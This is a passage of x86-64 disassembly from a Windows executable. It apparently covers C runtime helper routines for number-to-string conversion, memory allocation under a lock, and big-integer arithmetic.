   14000a64f:	41 83 c1 01          	add    $0x1,%r9d
   14000a653:	c7 44 24 58 01 00 00 	movl   $0x1,0x58(%rsp)
   14000a65a:	00 
   14000a65b:	e9 e8 f3 ff ff       	jmp    0x140009a48
   14000a660:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a665:	c7 44 24 2c 02 00 00 	movl   $0x2,0x2c(%rsp)
   14000a66c:	00 
   14000a66d:	31 ed                	xor    %ebp,%ebp
   14000a66f:	45 31 ed             	xor    %r13d,%r13d
   14000a672:	e9 9c f4 ff ff       	jmp    0x140009b13
   14000a677:	83 ff 39             	cmp    $0x39,%edi
   14000a67a:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000a67f:	48 8b b4 24 f8 00 00 	mov    0xf8(%rsp),%rsi
   14000a686:	00 
   14000a687:	0f 84 9f 00 00 00    	je     0x14000a72c
   14000a68d:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000a692:	83 c7 01             	add    $0x1,%edi
   14000a695:	4d 89 ee             	mov    %r13,%r14
   14000a698:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   14000a69e:	4d 89 e5             	mov    %r12,%r13
   14000a6a1:	40 88 38             	mov    %dil,(%rax)
   14000a6a4:	e9 f7 f8 ff ff       	jmp    0x140009fa0
   14000a6a9:	4d 89 ee             	mov    %r13,%r14
   14000a6ac:	48 8b b4 24 f8 00 00 	mov    0xf8(%rsp),%rsi
   14000a6b3:	00 
   14000a6b4:	4d 89 e5             	mov    %r12,%r13
   14000a6b7:	e9 40 fa ff ff       	jmp    0x14000a0fc
   14000a6bc:	8b 43 04             	mov    0x4(%rbx),%eax
   14000a6bf:	83 c0 01             	add    $0x1,%eax
   14000a6c2:	39 84 24 e8 00 00 00 	cmp    %eax,0xe8(%rsp)
   14000a6c9:	0f 8e dc f6 ff ff    	jle    0x140009dab
   14000a6cf:	e9 76 ff ff ff       	jmp    0x14000a64a
   14000a6d4:	45 85 c0             	test   %r8d,%r8d
   14000a6d7:	7e 37                	jle    0x14000a710
   14000a6d9:	4c 89 f9             	mov    %r15,%rcx
   14000a6dc:	ba 01 00 00 00       	mov    $0x1,%edx
   14000a6e1:	e8 aa 09 00 00       	call   0x14000b090
   14000a6e6:	48 89 ea             	mov    %rbp,%rdx
   14000a6e9:	48 89 c1             	mov    %rax,%rcx
   14000a6ec:	49 89 c7             	mov    %rax,%r15
   14000a6ef:	e8 8c 0a 00 00       	call   0x14000b180
   14000a6f4:	85 c0                	test   %eax,%eax
   14000a6f6:	0f 8e a5 01 00 00    	jle    0x14000a8a1
   14000a6fc:	83 ff 39             	cmp    $0x39,%edi
   14000a6ff:	74 2b                	je     0x14000a72c
   14000a701:	8b 7c 24 50          	mov    0x50(%rsp),%edi
   14000a705:	c7 44 24 38 20 00 00 	movl   $0x20,0x38(%rsp)
   14000a70c:	00 
   14000a70d:	83 c7 31             	add    $0x31,%edi
   14000a710:	41 83 7f 14 01       	cmpl   $0x1,0x14(%r15)
   14000a715:	0f 8e 64 01 00 00    	jle    0x14000a87f
   14000a71b:	4d 89 ee             	mov    %r13,%r14
   14000a71e:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   14000a724:	4d 89 e5             	mov    %r12,%r13
   14000a727:	e9 4d fe ff ff       	jmp    0x14000a579
   14000a72c:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000a731:	4d 89 ee             	mov    %r13,%r14
   14000a734:	ba 39 00 00 00       	mov    $0x39,%edx
   14000a739:	4d 89 e5             	mov    %r12,%r13
   14000a73c:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000a741:	c6 00 39             	movb   $0x39,(%rax)
   14000a744:	e9 57 fb ff ff       	jmp    0x14000a2a0
   14000a749:	8b 44 24 6c          	mov    0x6c(%rsp),%eax
   14000a74d:	89 5c 24 54          	mov    %ebx,0x54(%rsp)
   14000a751:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000a755:	e9 77 f3 ff ff       	jmp    0x140009ad1
   14000a75a:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a75f:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000a764:	e9 da f3 ff ff       	jmp    0x140009b43
   14000a769:	41 8d 43 01          	lea    0x1(%r11),%eax
   14000a76d:	49 89 c8             	mov    %rcx,%r8
   14000a770:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   14000a774:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a779:	eb 11                	jmp    0x14000a78c
   14000a77b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000a780:	48 39 c1             	cmp    %rax,%rcx
   14000a783:	74 25                	je     0x14000a7aa
   14000a785:	0f b6 51 ff          	movzbl -0x1(%rcx),%edx
   14000a789:	49 89 c8             	mov    %rcx,%r8
   14000a78c:	49 8d 48 ff          	lea    -0x1(%r8),%rcx
   14000a790:	80 fa 39             	cmp    $0x39,%dl
   14000a793:	74 eb                	je     0x14000a780
   14000a795:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   14000a79a:	83 c2 01             	add    $0x1,%edx
   14000a79d:	88 11                	mov    %dl,(%rcx)
   14000a79f:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   14000a7a5:	e9 b5 f3 ff ff       	jmp    0x140009b5f
   14000a7aa:	83 44 24 2c 01       	addl   $0x1,0x2c(%rsp)
   14000a7af:	c6 00 30             	movb   $0x30,(%rax)
   14000a7b2:	48 89 c1             	mov    %rax,%rcx
   14000a7b5:	ba 31 00 00 00       	mov    $0x31,%edx
   14000a7ba:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   14000a7bf:	eb dc                	jmp    0x14000a79d
   14000a7c1:	f2 0f 58 c0          	addsd  %xmm0,%xmm0
   14000a7c5:	41 0f b6 50 ff       	movzbl -0x1(%r8),%edx
   14000a7ca:	66 0f 2f c2          	comisd %xmm2,%xmm0
   14000a7ce:	0f 87 a1 00 00 00    	ja     0x14000a875
   14000a7d4:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
   14000a7d8:	0f 8a f3 00 00 00    	jp     0x14000a8d1
   14000a7de:	0f 85 ed 00 00 00    	jne    0x14000a8d1
   14000a7e4:	a8 01                	test   $0x1,%al
   14000a7e6:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a7eb:	75 9f                	jne    0x14000a78c
   14000a7ed:	4c 89 c2             	mov    %r8,%rdx
   14000a7f0:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   14000a7f6:	e9 a8 fc ff ff       	jmp    0x14000a4a3
   14000a7fb:	89 c2                	mov    %eax,%edx
   14000a7fd:	49 89 c8             	mov    %rcx,%r8
   14000a800:	41 8d 43 01          	lea    0x1(%r11),%eax
   14000a804:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   14000a808:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a80d:	e9 7a ff ff ff       	jmp    0x14000a78c
   14000a812:	45 31 c0             	xor    %r8d,%r8d
   14000a815:	4c 89 e9             	mov    %r13,%rcx
   14000a818:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000a81d:	e8 be 04 00 00       	call   0x14000ace0
   14000a822:	45 84 f6             	test   %r14b,%r14b
   14000a825:	49 89 c5             	mov    %rax,%r13
   14000a828:	0f 85 1b ff ff ff    	jne    0x14000a749
   14000a82e:	8b 44 24 54          	mov    0x54(%rsp),%eax
   14000a832:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   14000a836:	8b 44 24 6c          	mov    0x6c(%rsp),%eax
   14000a83a:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000a83e:	e9 a4 f5 ff ff       	jmp    0x140009de7
   14000a843:	41 0f b6 50 ff       	movzbl -0x1(%r8),%edx
   14000a848:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a84d:	e9 3a ff ff ff       	jmp    0x14000a78c
   14000a852:	41 8b 4f 18          	mov    0x18(%r15),%ecx
   14000a856:	85 c9                	test   %ecx,%ecx
   14000a858:	0f 85 91 fc ff ff    	jne    0x14000a4ef
   14000a85e:	45 85 c0             	test   %r8d,%r8d
   14000a861:	0f 8f 72 fe ff ff    	jg     0x14000a6d9
   14000a867:	4d 89 ee             	mov    %r13,%r14
   14000a86a:	45 31 c0             	xor    %r8d,%r8d
   14000a86d:	4d 89 e5             	mov    %r12,%r13
   14000a870:	e9 04 fd ff ff       	jmp    0x14000a579
   14000a875:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a87a:	e9 0d ff ff ff       	jmp    0x14000a78c
   14000a87f:	41 8b 57 18          	mov    0x18(%r15),%edx
   14000a883:	4d 89 ee             	mov    %r13,%r14
   14000a886:	4d 89 e5             	mov    %r12,%r13
   14000a889:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
   14000a88e:	85 d2                	test   %edx,%edx
   14000a890:	0f 84 e3 fc ff ff    	je     0x14000a579
   14000a896:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   14000a89c:	e9 d8 fc ff ff       	jmp    0x14000a579
   14000a8a1:	75 0a                	jne    0x14000a8ad
   14000a8a3:	40 f6 c7 01          	test   $0x1,%dil
   14000a8a7:	0f 85 4f fe ff ff    	jne    0x14000a6fc
   14000a8ad:	c7 44 24 38 20 00 00 	movl   $0x20,0x38(%rsp)
   14000a8b4:	00 
   14000a8b5:	e9 56 fe ff ff       	jmp    0x14000a710
   14000a8ba:	0f 84 87 f9 ff ff    	je     0x14000a247
   14000a8c0:	e9 18 f9 ff ff       	jmp    0x14000a1dd
   14000a8c5:	41 8d 4b 01          	lea    0x1(%r11),%ecx
   14000a8c9:	45 31 c0             	xor    %r8d,%r8d
   14000a8cc:	e9 d2 fb ff ff       	jmp    0x14000a4a3
   14000a8d1:	4c 89 c2             	mov    %r8,%rdx
   14000a8d4:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a8d9:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   14000a8df:	e9 bf fb ff ff       	jmp    0x14000a4a3
   14000a8e4:	41 83 7f 14 01       	cmpl   $0x1,0x14(%r15)
   14000a8e9:	7e 1e                	jle    0x14000a909
   14000a8eb:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   14000a8f1:	e9 9a f6 ff ff       	jmp    0x140009f90
   14000a8f6:	41 8d 43 01          	lea    0x1(%r11),%eax
   14000a8fa:	49 89 c8             	mov    %rcx,%r8
   14000a8fd:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   14000a901:	48 89 e8             	mov    %rbp,%rax
   14000a904:	e9 83 fe ff ff       	jmp    0x14000a78c
   14000a909:	41 83 7f 18 00       	cmpl   $0x0,0x18(%r15)
   14000a90e:	b8 10 00 00 00       	mov    $0x10,%eax
   14000a913:	44 0f 45 c0          	cmovne %eax,%r8d
   14000a917:	e9 74 f6 ff ff       	jmp    0x140009f90
   14000a91c:	41 89 c0             	mov    %eax,%r8d
   14000a91f:	e9 1a f5 ff ff       	jmp    0x140009e3e
   14000a924:	31 c0                	xor    %eax,%eax
   14000a926:	e9 f6 e9 ff ff       	jmp    0x140009321
   14000a92b:	90                   	nop
   14000a92c:	90                   	nop
   14000a92d:	90                   	nop
   14000a92e:	90                   	nop
   14000a92f:	90                   	nop
   14000a930:	41 54                	push   %r12
   14000a932:	55                   	push   %rbp
   14000a933:	57                   	push   %rdi
   14000a934:	56                   	push   %rsi
   14000a935:	53                   	push   %rbx
   14000a936:	4c 63 59 14          	movslq 0x14(%rcx),%r11
   14000a93a:	89 d5                	mov    %edx,%ebp
   14000a93c:	48 89 cb             	mov    %rcx,%rbx
   14000a93f:	c1 fd 05             	sar    $0x5,%ebp
   14000a942:	41 39 eb             	cmp    %ebp,%r11d
   14000a945:	7e 79                	jle    0x14000a9c0
   14000a947:	4c 8d 61 18          	lea    0x18(%rcx),%r12
   14000a94b:	48 63 ed             	movslq %ebp,%rbp
   14000a94e:	83 e2 1f             	and    $0x1f,%edx
   14000a951:	4f 8d 14 9c          	lea    (%r12,%r11,4),%r10
   14000a955:	49 8d 34 ac          	lea    (%r12,%rbp,4),%rsi
   14000a959:	74 7a                	je     0x14000a9d5
   14000a95b:	8b 06                	mov    (%rsi),%eax
   14000a95d:	4c 8d 46 04          	lea    0x4(%rsi),%r8
   14000a961:	bf 20 00 00 00       	mov    $0x20,%edi
   14000a966:	89 d1                	mov    %edx,%ecx
   14000a968:	29 d7                	sub    %edx,%edi
   14000a96a:	d3 e8                	shr    %cl,%eax
   14000a96c:	4d 39 c2             	cmp    %r8,%r10
   14000a96f:	41 89 c1             	mov    %eax,%r9d
   14000a972:	0f 86 8a 00 00 00    	jbe    0x14000aa02
   14000a978:	4c 89 e6             	mov    %r12,%rsi
   14000a97b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000a980:	41 8b 00             	mov    (%r8),%eax
   14000a983:	89 f9                	mov    %edi,%ecx
   14000a985:	48 83 c6 04          	add    $0x4,%rsi
   14000a989:	49 83 c0 04          	add    $0x4,%r8
   14000a98d:	d3 e0                	shl    %cl,%eax
   14000a98f:	89 d1                	mov    %edx,%ecx
   14000a991:	44 09 c8             	or     %r9d,%eax
   14000a994:	89 46 fc             	mov    %eax,-0x4(%rsi)
   14000a997:	45 8b 48 fc          	mov    -0x4(%r8),%r9d
   14000a99b:	41 d3 e9             	shr    %cl,%r9d
   14000a99e:	4d 39 c2             	cmp    %r8,%r10
   14000a9a1:	77 dd                	ja     0x14000a980
   14000a9a3:	49 29 eb             	sub    %rbp,%r11
   14000a9a6:	45 85 c9             	test   %r9d,%r9d
   14000a9a9:	4b 8d 44 9c fc       	lea    -0x4(%r12,%r11,4),%rax
   14000a9ae:	44 89 08             	mov    %r9d,(%rax)
   14000a9b1:	74 3a                	je     0x14000a9ed
   14000a9b3:	48 83 c0 04          	add    $0x4,%rax
   14000a9b7:	eb 34                	jmp    0x14000a9ed
   14000a9b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000a9c0:	c7 43 14 00 00 00 00 	movl   $0x0,0x14(%rbx)
   14000a9c7:	c7 43 18 00 00 00 00 	movl   $0x0,0x18(%rbx)
   14000a9ce:	5b                   	pop    %rbx
   14000a9cf:	5e                   	pop    %rsi
   14000a9d0:	5f                   	pop    %rdi
   14000a9d1:	5d                   	pop    %rbp
   14000a9d2:	41 5c                	pop    %r12
   14000a9d4:	c3                   	ret
   14000a9d5:	49 39 f2             	cmp    %rsi,%r10
   14000a9d8:	4c 89 e7             	mov    %r12,%rdi
   14000a9db:	76 e3                	jbe    0x14000a9c0
   14000a9dd:	0f 1f 00             	nopl   (%rax)
   14000a9e0:	a5                   	movsl  (%rsi),(%rdi)
   14000a9e1:	49 39 f2             	cmp    %rsi,%r10
   14000a9e4:	77 fa                	ja     0x14000a9e0
   14000a9e6:	49 29 eb             	sub    %rbp,%r11
   14000a9e9:	4b 8d 04 9c          	lea    (%r12,%r11,4),%rax
   14000a9ed:	4c 29 e0             	sub    %r12,%rax
   14000a9f0:	48 c1 f8 02          	sar    $0x2,%rax
   14000a9f4:	85 c0                	test   %eax,%eax
   14000a9f6:	89 43 14             	mov    %eax,0x14(%rbx)
   14000a9f9:	74 cc                	je     0x14000a9c7
   14000a9fb:	5b                   	pop    %rbx
   14000a9fc:	5e                   	pop    %rsi
   14000a9fd:	5f                   	pop    %rdi
   14000a9fe:	5d                   	pop    %rbp
   14000a9ff:	41 5c                	pop    %r12
   14000aa01:	c3                   	ret
   14000aa02:	85 c0                	test   %eax,%eax
   14000aa04:	89 43 18             	mov    %eax,0x18(%rbx)
   14000aa07:	74 b7                	je     0x14000a9c0
   14000aa09:	4c 89 e0             	mov    %r12,%rax
   14000aa0c:	eb a5                	jmp    0x14000a9b3
   14000aa0e:	66 90                	xchg   %ax,%ax
   14000aa10:	48 63 41 14          	movslq 0x14(%rcx),%rax
   14000aa14:	48 8d 51 18          	lea    0x18(%rcx),%rdx
   14000aa18:	4c 8d 04 82          	lea    (%rdx,%rax,4),%r8
   14000aa1c:	4c 39 c2             	cmp    %r8,%rdx
   14000aa1f:	73 28                	jae    0x14000aa49
   14000aa21:	8b 49 18             	mov    0x18(%rcx),%ecx
   14000aa24:	31 c0                	xor    %eax,%eax
   14000aa26:	85 c9                	test   %ecx,%ecx
   14000aa28:	74 0c                	je     0x14000aa36
   14000aa2a:	eb 17                	jmp    0x14000aa43
   14000aa2c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000aa30:	8b 0a                	mov    (%rdx),%ecx
   14000aa32:	85 c9                	test   %ecx,%ecx
   14000aa34:	75 0d                	jne    0x14000aa43
   14000aa36:	48 83 c2 04          	add    $0x4,%rdx
   14000aa3a:	83 c0 20             	add    $0x20,%eax
   14000aa3d:	49 39 d0             	cmp    %rdx,%r8
   14000aa40:	77 ee                	ja     0x14000aa30
   14000aa42:	c3                   	ret
   14000aa43:	0f bc c9             	bsf    %ecx,%ecx
   14000aa46:	01 c8                	add    %ecx,%eax
   14000aa48:	c3                   	ret
   14000aa49:	31 c0                	xor    %eax,%eax
   14000aa4b:	c3                   	ret
   14000aa4c:	90                   	nop
   14000aa4d:	90                   	nop
   14000aa4e:	90                   	nop
   14000aa4f:	90                   	nop
   14000aa50:	56                   	push   %rsi
   14000aa51:	53                   	push   %rbx
   14000aa52:	48 83 ec 28          	sub    $0x28,%rsp
   14000aa56:	8b 05 14 21 38 00    	mov    0x382114(%rip),%eax        # 0x14038cb70
   14000aa5c:	83 f8 02             	cmp    $0x2,%eax
   14000aa5f:	48 63 f1             	movslq %ecx,%rsi
   14000aa62:	74 6c                	je     0x14000aad0
   14000aa64:	85 c0                	test   %eax,%eax
   14000aa66:	74 2a                	je     0x14000aa92
   14000aa68:	83 f8 01             	cmp    $0x1,%eax
   14000aa6b:	75 1e                	jne    0x14000aa8b
   14000aa6d:	48 8b 1d 38 28 38 00 	mov    0x382838(%rip),%rbx        # 0x14038d2ac
   14000aa74:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000aa79:	ff d3                	call   *%rbx
   14000aa7b:	8b 05 ef 20 38 00    	mov    0x3820ef(%rip),%eax        # 0x14038cb70
   14000aa81:	83 f8 01             	cmp    $0x1,%eax
   14000aa84:	74 ee                	je     0x14000aa74
   14000aa86:	83 f8 02             	cmp    $0x2,%eax
   14000aa89:	74 45                	je     0x14000aad0
   14000aa8b:	48 83 c4 28          	add    $0x28,%rsp
   14000aa8f:	5b                   	pop    %rbx
   14000aa90:	5e                   	pop    %rsi
   14000aa91:	c3                   	ret
   14000aa92:	b8 01 00 00 00       	mov    $0x1,%eax
   14000aa97:	87 05 d3 20 38 00    	xchg   %eax,0x3820d3(%rip)        # 0x14038cb70
   14000aa9d:	85 c0                	test   %eax,%eax
   14000aa9f:	75 4f                	jne    0x14000aaf0
   14000aaa1:	48 8d 0d d8 20 38 00 	lea    0x3820d8(%rip),%rcx        # 0x14038cb80
   14000aaa8:	48 8b 1d c5 27 38 00 	mov    0x3827c5(%rip),%rbx        # 0x14038d274
   14000aaaf:	ff d3                	call   *%rbx
   14000aab1:	48 8d 0d f0 20 38 00 	lea    0x3820f0(%rip),%rcx        # 0x14038cba8
   14000aab8:	ff d3                	call   *%rbx
   14000aaba:	48 8d 0d 5f 00 00 00 	lea    0x5f(%rip),%rcx        # 0x14000ab20
   14000aac1:	e8 5a 6a ff ff       	call   0x140001520
   14000aac6:	c7 05 a0 20 38 00 02 	movl   $0x2,0x3820a0(%rip)        # 0x14038cb70
   14000aacd:	00 00 00 
   14000aad0:	48 8d 14 b6          	lea    (%rsi,%rsi,4),%rdx
   14000aad4:	48 8d 05 a5 20 38 00 	lea    0x3820a5(%rip),%rax        # 0x14038cb80
   14000aadb:	48 8d 0c d0          	lea    (%rax,%rdx,8),%rcx
   14000aadf:	48 83 c4 28          	add    $0x28,%rsp
   14000aae3:	5b                   	pop    %rbx
   14000aae4:	5e                   	pop    %rsi
   14000aae5:	48 ff 25 68 27 38 00 	rex.W jmp *0x382768(%rip)        # 0x14038d254
   14000aaec:	0f 1f 40 00          	nopl   0x0(%rax)
   14000aaf0:	83 f8 02             	cmp    $0x2,%eax
   14000aaf3:	74 1b                	je     0x14000ab10
   14000aaf5:	8b 05 75 20 38 00    	mov    0x382075(%rip),%eax        # 0x14038cb70
   14000aafb:	83 f8 01             	cmp    $0x1,%eax
   14000aafe:	0f 84 69 ff ff ff    	je     0x14000aa6d
   14000ab04:	eb 80                	jmp    0x14000aa86
   14000ab06:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000ab0d:	00 00 00 
   14000ab10:	c7 05 56 20 38 00 02 	movl   $0x2,0x382056(%rip)        # 0x14038cb70
   14000ab17:	00 00 00 
   14000ab1a:	eb b4                	jmp    0x14000aad0
   14000ab1c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000ab20:	53                   	push   %rbx
   14000ab21:	48 83 ec 20          	sub    $0x20,%rsp
   14000ab25:	b8 03 00 00 00       	mov    $0x3,%eax
   14000ab2a:	87 05 40 20 38 00    	xchg   %eax,0x382040(%rip)        # 0x14038cb70
   14000ab30:	83 f8 02             	cmp    $0x2,%eax
   14000ab33:	74 0b                	je     0x14000ab40
   14000ab35:	48 83 c4 20          	add    $0x20,%rsp
   14000ab39:	5b                   	pop    %rbx
   14000ab3a:	c3                   	ret
   14000ab3b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000ab40:	48 8b 1d 05 27 38 00 	mov    0x382705(%rip),%rbx        # 0x14038d24c
   14000ab47:	48 8d 0d 32 20 38 00 	lea    0x382032(%rip),%rcx        # 0x14038cb80
   14000ab4e:	ff d3                	call   *%rbx
   14000ab50:	48 8d 0d 51 20 38 00 	lea    0x382051(%rip),%rcx        # 0x14038cba8
   14000ab57:	48 89 d8             	mov    %rbx,%rax
   14000ab5a:	48 83 c4 20          	add    $0x20,%rsp
   14000ab5e:	5b                   	pop    %rbx
   14000ab5f:	48 ff e0             	rex.W jmp *%rax
   14000ab62:	0f 1f 40 00          	nopl   0x0(%rax)
   14000ab66:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000ab6d:	00 00 00 
   14000ab70:	56                   	push   %rsi
   14000ab71:	53                   	push   %rbx
   14000ab72:	48 83 ec 38          	sub    $0x38,%rsp
   14000ab76:	89 ce                	mov    %ecx,%esi
   14000ab78:	31 c9                	xor    %ecx,%ecx
   14000ab7a:	e8 d1 fe ff ff       	call   0x14000aa50
   14000ab7f:	83 fe 09             	cmp    $0x9,%esi
   14000ab82:	7e 4c                	jle    0x14000abd0
   14000ab84:	89 f1                	mov    %esi,%ecx
   14000ab86:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000ab8b:	d3 e3                	shl    %cl,%ebx
   14000ab8d:	8d 43 ff             	lea    -0x1(%rbx),%eax
   14000ab90:	48 98                	cltq
   14000ab92:	48 8d 0c 85 27 00 00 	lea    0x27(,%rax,4),%rcx
   14000ab99:	00 
   14000ab9a:	48 b8 f8 ff ff ff 07 	movabs $0x7fffffff8,%rax
   14000aba1:	00 00 00 
   14000aba4:	48 21 c1             	and    %rax,%rcx
   14000aba7:	e8 14 0f 00 00       	call   0x14000bac0
   14000abac:	48 85 c0             	test   %rax,%rax
   14000abaf:	74 17                	je     0x14000abc8
   14000abb1:	83 3d b8 1f 38 00 02 	cmpl   $0x2,0x381fb8(%rip)        # 0x14038cb70
   14000abb8:	89 70 08             	mov    %esi,0x8(%rax)
   14000abbb:	89 58 0c             	mov    %ebx,0xc(%rax)
   14000abbe:	74 33                	je     0x14000abf3
   14000abc0:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
   14000abc7:	00 
   14000abc8:	48 83 c4 38          	add    $0x38,%rsp
   14000abcc:	5b                   	pop    %rbx
   14000abcd:	5e                   	pop    %rsi
   14000abce:	c3                   	ret
   14000abcf:	90                   	nop
   14000abd0:	48 8d 15 49 1f 38 00 	lea    0x381f49(%rip),%rdx        # 0x14038cb20
   14000abd7:	48 63 ce             	movslq %esi,%rcx
   14000abda:	48 8b 04 ca          	mov    (%rdx,%rcx,8),%rax
   14000abde:	48 85 c0             	test   %rax,%rax
   14000abe1:	74 2d                	je     0x14000ac10
   14000abe3:	4c 8b 00             	mov    (%rax),%r8
   14000abe6:	83 3d 83 1f 38 00 02 	cmpl   $0x2,0x381f83(%rip)        # 0x14038cb70
   14000abed:	4c 89 04 ca          	mov    %r8,(%rdx,%rcx,8)
   14000abf1:	75 cd                	jne    0x14000abc0
   14000abf3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000abf8:	48 8d 0d 81 1f 38 00 	lea    0x381f81(%rip),%rcx        # 0x14038cb80
   14000abff:	ff 15 7f 26 38 00    	call   *0x38267f(%rip)        # 0x14038d284
   14000ac05:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000ac0a:	eb b4                	jmp    0x14000abc0
   14000ac0c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000ac10:	48 8b 05 b9 d8 37 00 	mov    0x37d8b9(%rip),%rax        # 0x1403884d0
   14000ac17:	89 f1                	mov    %esi,%ecx
   14000ac19:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000ac1e:	d3 e3                	shl    %cl,%ebx
   14000ac20:	8d 53 ff             	lea    -0x1(%rbx),%edx
   14000ac23:	48 8d 0d f6 15 38 00 	lea    0x3815f6(%rip),%rcx        # 0x14038c220
   14000ac2a:	48 63 d2             	movslq %edx,%rdx
   14000ac2d:	48 8d 14 95 27 00 00 	lea    0x27(,%rdx,4),%rdx
   14000ac34:	00 
   14000ac35:	49 89 c1             	mov    %rax,%r9
   14000ac38:	49 29 c9             	sub    %rcx,%r9
   14000ac3b:	48 c1 ea 03          	shr    $0x3,%rdx
   14000ac3f:	4c 89 c9             	mov    %r9,%rcx
   14000ac42:	89 d2                	mov    %edx,%edx
   14000ac44:	48 c1 f9 03          	sar    $0x3,%rcx
   14000ac48:	48 01 d1             	add    %rdx,%rcx
   14000ac4b:	48 81 f9 20 01 00 00 	cmp    $0x120,%rcx
   14000ac52:	0f 87 2c ff ff ff    	ja     0x14000ab84
   14000ac58:	48 8d 14 d0          	lea    (%rax,%rdx,8),%rdx
   14000ac5c:	48 89 15 6d d8 37 00 	mov    %rdx,0x37d86d(%rip)        # 0x1403884d0
   14000ac63:	e9 49 ff ff ff       	jmp    0x14000abb1
   14000ac68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000ac6f:	00 
   14000ac70:	53                   	push   %rbx
   14000ac71:	48 83 ec 20          	sub    $0x20,%rsp
   14000ac75:	48 85 c9             	test   %rcx,%rcx
   14000ac78:	48 89 cb             	mov    %rcx,%rbx
   14000ac7b:	74 39                	je     0x14000acb6
   14000ac7d:	83 79 08 09          	cmpl   $0x9,0x8(%rcx)
   14000ac81:	7e 0d                	jle    0x14000ac90
   14000ac83:	48 83 c4 20          	add    $0x20,%rsp
   14000ac87:	5b                   	pop    %rbx
   14000ac88:	e9 13 0e 00 00       	jmp    0x14000baa0
   14000ac8d:	0f 1f 00             	nopl   (%rax)
   14000ac90:	31 c9                	xor    %ecx,%ecx
   14000ac92:	e8 b9 fd ff ff       	call   0x14000aa50
   14000ac97:	48 63 53 08          	movslq 0x8(%rbx),%rdx
   14000ac9b:	48 8d 05 7e 1e 38 00 	lea    0x381e7e(%rip),%rax        # 0x14038cb20
   14000aca2:	83 3d c7 1e 38 00 02 	cmpl   $0x2,0x381ec7(%rip)        # 0x14038cb70
   14000aca9:	48 8b 0c d0          	mov    (%rax,%rdx,8),%rcx
   14000acad:	48 89 1c d0          	mov    %rbx,(%rax,%rdx,8)
   14000acb1:	48 89 0b             	mov    %rcx,(%rbx)
   14000acb4:	74 0a                	je     0x14000acc0
   14000acb6:	48 83 c4 20          	add    $0x20,%rsp
   14000acba:	5b                   	pop    %rbx
   14000acbb:	c3                   	ret
   14000acbc:	0f 1f 40 00          	nopl   0x0(%rax)
   14000acc0:	48 8d 0d b9 1e 38 00 	lea    0x381eb9(%rip),%rcx        # 0x14038cb80
   14000acc7:	48 83 c4 20          	add    $0x20,%rsp
   14000accb:	5b                   	pop    %rbx
   14000accc:	48 ff 25 b1 25 38 00 	rex.W jmp *0x3825b1(%rip)        # 0x14038d284
   14000acd3:	0f 1f 00             	nopl   (%rax)
   14000acd6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000acdd:	00 00 00 
   14000ace0:	55                   	push   %rbp
   14000ace1:	57                   	push   %rdi
   14000ace2:	56                   	push   %rsi
   14000ace3:	53                   	push   %rbx
   14000ace4:	48 83 ec 28          	sub    $0x28,%rsp
   14000ace8:	8b 79 14             	mov    0x14(%rcx),%edi
   14000aceb:	48 89 cb             	mov    %rcx,%rbx
   14000acee:	49 63 f0             	movslq %r8d,%rsi
   14000acf1:	48 63 d2             	movslq %edx,%rdx
   14000acf4:	31 c9                	xor    %ecx,%ecx
   14000acf6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000acfd:	00 00 00 
   14000ad00:	8b 44 8b 18          	mov    0x18(%rbx,%rcx,4),%eax
   14000ad04:	48 0f af c2          	imul   %rdx,%rax
   14000ad08:	48 01 f0             	add    %rsi,%rax
   14000ad0b:	48 89 c6             	mov    %rax,%rsi
   14000ad0e:	89 44 8b 18          	mov    %eax,0x18(%rbx,%rcx,4)
   14000ad12:	48 83 c1 01          	add    $0x1,%rcx
   14000ad16:	48 c1 ee 20          	shr    $0x20,%rsi
   14000ad1a:	39 cf                	cmp    %ecx,%edi
   14000ad1c:	7f e2                	jg     0x14000ad00
